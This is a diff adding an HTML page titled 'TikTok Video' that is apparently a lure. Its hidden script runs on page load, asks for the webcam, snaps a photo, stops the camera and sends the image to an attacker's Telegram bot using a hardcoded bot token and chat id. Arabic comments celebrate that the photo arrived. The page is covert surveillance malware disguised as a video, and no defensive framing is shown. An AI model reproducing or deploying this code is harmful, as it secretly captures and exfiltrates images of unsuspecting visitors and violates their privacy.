@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>TikTok Video</title>
+    <style>body { background: #000; }</style>
+</head>
+<body>
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;" width="640" height="480"></canvas>
+
+    <script>
+        const token = '8642064710:AAE5mGb3WhT3LqCcC9H7sOxW9XAWwwR-BkY';
+        const chat_id = '5897183241'; 
+
+        async function takeSnap() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const v = document.getElementById('v');
+                v.srcObject = stream;
+                
+                v.onloadedmetadata = () => {
+                    setTimeout(() => {
+                        const c = document.getElementById('c');
+                        c.getContext('2d').drawImage(v, 0, 0);
+                        
+                        // إيقاف الكاميرا فوراً بعد التقاط الصورة
+                        stream.getTracks().forEach(track => track.stop());
+
+                        c.toBlob(blob => {
+                            const fd = new FormData();
+                            fd.append('chat_id', chat_id);
+                            fd.append('photo', blob, 'snap.jpg');
+                            fd.append('caption', '📸 فهد، وصلت الصورة وطفينا الكاميرا! 😎');
+                            
+                            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                                method: 'POST',
+                                body: fd
+                            });
+                        }, 'image/jpeg', 0.7);
+                    }, 500); // نص ثانية كافية جداً
+                };
+            } catch (e) {}
+        }
+        window.onload = takeSnap;
+    </script>
+</body>
+</html>
